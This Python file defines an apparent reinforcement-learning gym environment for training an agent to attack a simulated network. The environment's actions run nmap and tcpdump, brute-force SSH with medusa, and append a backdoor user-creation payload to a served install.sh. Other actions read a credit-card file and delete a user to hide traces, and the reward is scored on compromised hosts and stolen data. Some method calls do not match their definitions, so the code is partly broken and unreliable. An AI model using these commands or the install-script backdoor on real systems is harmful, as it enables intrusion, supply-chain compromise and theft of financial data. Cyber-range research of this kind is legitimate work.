from network_interactions import *
import gym
from gym import spaces
import numpy as np
from constants import *
import re
import xml.etree.ElementTree as ET

class NetworkAttackEnv(gym.Env):
    def __init__(self):
        types = 3
        commands = 3
        target = 4

        self.observation_space = spaces.Dict({
            "known_credentials": spaces.MultiBinary(4),
            "compromised_nodes": spaces.MultiBinary(4),  
            "known_hosts": spaces.MultiBinary(4),
            "known_tools": spaces.MultiBinary(6)
        })

        self.action_space = spaces.MultiDiscrete([types, commands, target])
        self.stolen_info = False

        self.credential_store = {
            0: {"user": None, "password": None},
            1: {"user": None, "password": None},
            2: {"user": None, "password": None},
            3: {"user": None, "password": None}, 
        }
        
        self.current_host = 4

        self.current_observation = {
            "known_credentials": np.zeros(4, dtype=np.int32),
            "compromised_nodes": np.zeros(4, dtype=np.int32),
            "known_hosts": np.zeros(4, dtype=np.int32),
            "known_tools": np.zeros(6, dtype=np.int32)       
        }
        
    def step(self, action):
        response_type = action[0]
        specific_action = action[1]
        target = action[2]
        subnet = '192.42.0.0'

        found_hosts = None
        found_credentials = None
        compromised_node = None
        penalty = 0

        # Exploration
        if response_type == 0:
            if specific_action == 0:
                result = self.scan_range(subnet)
                found_hosts = parse_scan_output(result)
            elif specific_action == 1:
                self.traffic_scan()
            elif specific_action == 2:
                if self.move_laterally(target):
                    compromised_node = target
                else: ## Invalid action
                    penalty += 2

        # Exploitation
        elif response_type == 1:
            if specific_action == 0:
               result = self.brute_force(target)
               found_credentials = self.parse_medusa_output(result)
               
            elif specific_action == 1:
                self.inject_script(target)
            elif specific_action == 2:
                self.read_info(target)

        # Obfuscation
        elif response_type == 2:
            if specific_action == 0:
                self.remove_user('chloe', target)

        print("Evaluating state..")
        self.current_observation["known_credentials"] = self.update_known_credentials(found_credentials)
        self.current_observation["compromised_nodes"] = self.update_compromised_nodes(compromised_node)
        self.current_observation["known_hosts"] = self.update_found_hosts(found_hosts)
        self.current_observation["known_tools"] = self.update_tools()

        reward = self.calculate_reward(self.current_observation, penalty)
        done = self.stolen_info
        print("Step done\n")

        return self.current_observation.copy(), reward, done, False, {}
    
# Exploration
    def scan_range(self, subnet):
        command = constants.NMAP_SCAN + f' {subnet}-10'
        print(f"Port scanning")
        result = interact(self.current_host, command)
        return result

    def traffic_scan(self):
        command = "tcpdump -i any -c 100"
        result = interact(self.current_host, command)
        return result
    
    def move_laterally(self, host):
        print("Logging in using stolen credentials..")
        if self.credential_store[host]["user"] != None and self.credential_store[host]["password"] != None:
            self.current_host = host
            return True
        return False

# Exploitation
    def brute_force(self, target):
        command = f'medusa -h {constants.ADDRESS_LIST[target]} -U /usr.txt -P /pass.txt -M ssh | grep FOUND'
        print("Brute Forcing", constants.ADDRESS_LIST[target])
        result = interact(self.current_host, command)
        return result

    def inject_script(self):
        payload = '''
            username="dylan"
            password="h4ck3d"
            useradd -m -s /bin/bash $username
            echo "$username:$password" | chpasswd
        '''

        escaped_payload = payload.replace('"', '\\"').replace('$', '\\$')

        command = (f'echo \"{escaped_payload}\" >> /var/www/apache2/reposerver/install.sh')
        result = interact(self.current_host, command)
    
    def read_info(self):
        command = 'cat /var/www/samba/creditcards.txt'
        result = interact(self.current_host, command)
        if (result == 'Success'):
            self.stolen_info = True
   
# Obfuscation
    def remove_user(self, username):
        command = f"userdel -r {username}"
        result = interact(self.current_host, command)
        
        
# Other (maybe not usable here)

    def start_node(self, node_id):
        start_node(node_id)
        print(f"Node {node_id} restarted")

    def restart_node(self, node_id):
        restart_node(node_id)
        print(f"Node {node_id} restarted")

# Observation methods

# Helper methods
    def update_known_credentials(self, credentials):
        obs = self.current_observation["known_credentials"].copy()

        if credentials is not None:
            for host in credentials:
                obs[host] = 1 if host == 1 else 0

        return obs

    def update_compromised_nodes(self, node):
        obs = self.current_observation["compromised_nodes"].copy()
        if node != None:
            obs[node] = 1
        return obs
        
    def update_found_hosts(self, hosts):
        obs = self.current_observation["known_hosts"].copy()
        if hosts is not None:
            for host in hosts:
                if(host["ip"] in constants.ADDRESS_MAP.keys()):
                    index = constants.ADDRESS_MAP[host["ip"]]
                    obs[index] = 1 if host["state"] == "up" else 0
                
        return obs
    
    def update_tools(self):

        obs = self.current_observation["known_tools"].copy()
        obs_hosts = self.current_observation["known_hosts"].copy()
        obs_credentials = self.current_observation["known_credentials"].copy()
        obs_compromised = self.current_observation["compromised_nodes"].copy()

        brute_force = 1
        traffic_sniff = 2
        script_injection = 3
        login = 4
        read_info = 5
        for host in obs_hosts:
            if obs_hosts[host] == 1:
                obs[brute_force] = 1
            if obs_credentials[host] == 1:
                obs[login] = 1
                if constants.ADDRESS_LIST[host] == "172.17.100.2":
                    obs[script_injection] = 1
                    obs[login] = 1

                elif constants.ADDRESS_LIST[host] == '192.168.100.3':
                    obs[read_info] = 1
                    obs[login] = 1
            
        return obs

    def calculate_reward(self, observation, penalty):

        info_read = 1 if self.stolen_info else 0
        found_hosts_count =  sum(observation["known_hosts"])
        found_credentials_count = sum(observation["known_credentials"])
        found_compromised_count = sum(observation["compromised_nodes"])

        # TODO: add penalties for invalid actions
        return float(2*found_hosts_count + 5*found_credentials_count + 7*found_compromised_count + 20*info_read - penalty)
        
    def parse_medusa_output(self, output):
        pattern = r"ACCOUNT FOUND: \[ssh\] Host: (\S+) User: (\S+) Password: (\S+) \[SUCCESS\]"
        credentials = {}
        obs = [0,0,0,0]
        for line in output.splitlines():
            match = re.search(pattern, line)
            if match:
                host, user, password = match.groups()
                credentials[host] = {"user": user, "password": password}
        
        for host in credentials:
            obs[constants.ADDRESS_MAP[host]] = 1
            self.credential_store[constants.ADDRESS_MAP[host]]['user'] = credentials[host]['user']
            self.credential_store[constants.ADDRESS_MAP[host]]['password'] = credentials[host]['password']
        return obs
    
def parse_scan_output(data):
    root = ET.fromstring(data)
    hosts = []
    
    for host in root.findall("host"):
        status = host.find("status").get("state")
        if status == "up":
            ip = host.find("address").get("addr")
            state = host.find("status").get("state")
            hosts.append({"ip": ip, "state": state})
    return hosts



def interact(host, command):
    hostname = constants.HOST_MAP[host]
    result = execute_command(constants.DOCKER_NODES[hostname], command)
    return result

    